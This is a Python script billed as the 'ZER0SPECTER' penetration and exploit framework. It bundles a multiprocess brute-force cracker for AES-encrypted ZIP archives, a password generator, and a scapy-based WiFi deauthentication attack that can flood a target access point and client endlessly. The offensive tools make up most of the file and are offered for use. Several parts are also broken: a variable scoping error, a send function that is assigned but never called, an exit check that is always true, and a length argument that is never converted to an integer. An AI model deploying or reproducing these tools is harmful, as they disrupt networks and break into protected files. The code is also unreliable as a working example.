import random
import string
import pyzipper
from itertools import product
from multiprocessing import Pool, cpu_count
import sys
import time
import os
import argparse
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

#printar a logo bonitinha
ascii_zero = (r"""
       █████████████████
     ██▒▒             ██▒▒
    ██▒▒    ██████     ██▒▒
   ██▒▒   ██   █  ██    ██▒▒
   ██▒▒   ██  █   ██    ██▒▒
    ██▒▒    ██████     ██▒▒
     ██▒▒             ██▒▒
       █████████████████
+=======================================+
|            ZER0SPECTER                |
|      Penetration & Exploit            |
+=======================================+
""")
def slow_print(text, delay=0.002):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
def loading_bar(duration=2, length=30):
    sys.stdout.write("[")
    sys.stdout.flush()
    for i in range(length):
        time.sleep(duration / length)
        sys.stdout.write("█")
        sys.stdout.flush()
    sys.stdout.write("]\n")
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    slow_print(ascii_zero, 0.0008)
    print("\n")
    slow_print("Loading zer0specter framework...\n", 0.02)
    loading_bar()
    time.sleep(0.3)
    slow_print("Initializing modules...\n", 0.02)
    loading_bar()
    time.sleep(0.3)
    slow_print("Ready.\n", 0.02)
if __name__ == "__main__":
    banner()

#features
def zipcrack():
    def args():
        argumentos = argparse.ArgumentParser(description="zipcracker")
        argumentos.add_argument("-l", "--letters", dest="esc1", help="add letters on password")
        argumentos.add_argument("-n", "--numbers", dest="esc2", help="add numbers")
        argumentos.add_argument("-sc", "--specialcharacters", dest="esc3", help="add specialcharacters")
        argumentos.add_argument("-s", "--size", dest="cs", help="estimated password length")
        argumentos.add_argument("-p", "--path", dest="arq", help="dir path")
        return argumentos.parse_args(sys.argv)
    senha = ''
    def escolhas(argu):
        if argu.esc1 == 'y':
            senha += string.ascii_letters
        if argu.esc2 == 'y':
            senha += string.digits
        if argu.esc3 == 'y':
            senha += string.punctuation
        if not senha:
            print('nothing selected, ending...')
            exit()
        return senha
    def ext(sen, arq):
        try:
            with pyzipper.AESZipFile(arq, 'r') as zp:
                zp.extractall(pwd=sen.encode())
            return (sen, True)
        except:
            return (sen, False)
    def res(argu):
        for sla in product(senha, repeat=argu.cs):
            yield ''.join(sla)
    if __name__ == "__main__":
        argu = args()
        escolhas(argu)
        with Pool(cpu_count()) as pool:
            for comb, sus in pool.imap_unordered(ext, res(argu), chunksize=500):
                print(f'Testing: {comb}')
                if sus:
                    print(f'broken with: {comb}')
                    pool.terminate()
                    break
def pass_gen():
    def arguments():
        parser = argparse.ArgumentParser(description="pass generator")
        parser.add_argument("-nc", "--numberchar", dest="cs", help="number of characters you password must have")
        parser.add_argument("-p", "--punctuation", dest="q1", help="did it have special character?")
        parser.add_argument("-n", "--numbers", dest="q2", help="did it have numbers?")
        parser.add_argument("-up", "--uppercase", dest="q3")
        return parser.parse_args(sys.argv)
    argum = arguments()
    senhag = []
    senhap = string.ascii_lowercase
    if argum.q1 == 'y':
        senhap += string.punctuation
    if argum.q2 == 'y':
        senhap += string.digits
    if argum.q3 == 'y':
        senhap += string.ascii_uppercase

    for _ in range (argum.cs):
        passw = random.choice(senhap)
        senhag.append(passw)
    print ("".join(senhag))
def wifi_blackout():
    def args():
        parser = argparse.ArgumentParser(description="WIFI Attack Deauth")
        parser.add_argument("-i", "--interface", dest="interface", help="WIFI interface")
        parser.add_argument("-a", "--ap", dest="bssid_ap", help="MAC from target")
        parser.add_argument("-c", "--client", dest="bssid_client", help="MAC from client")
        parser.add_argument("-n", "--count", dest="count", type=int, default=10, help="Packets count(0 for infinite)")
        parser.add_argument("--interval", dest="interval", type=float, default=0.1, help="Time between packets")
        options = parser.parse_args()
        return options
    def BDP(ap_mac, client_mac):
        packet = (
            RadioTap()/
            Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)/
            Dot11Deauth(reason=7)
        )
        return packet
    def packetsend(packet, interface, count, interval):
        if count == 0:
            print("[INFO]Sending packets for ∞ times... CTRL+C to stop it")
            sendp(packet, iface=interface, count=count, inter=interval, loop=1, verbose=1)
        else:
            print("[INFO]Sending packets for {count} times")
            sendp(packet, iface=interface,count=count, inter=interval, verbose=1)
    def main():
        options = args()
        pkt = BDP(options.bssid_ap, options.bssid_client)
        packetsend = (pkt, options.interface, options.count, options.interval)
    if __name__ == "__main__":
        main()

#execução
def main():
    while True:
        userin = input("[Zer0Specter] > ").strip().lower()
        if userin == "zipcrack":
            zipcrack()
        if userin == "passgen":
            pass_gen()
        if userin == "wifiblackout":
            wifi_blackout()
        if userin == "quit" or "exit":
            exit()
        if userin == "help":
            print("""""")
if __name__ == "__main__" :
    main()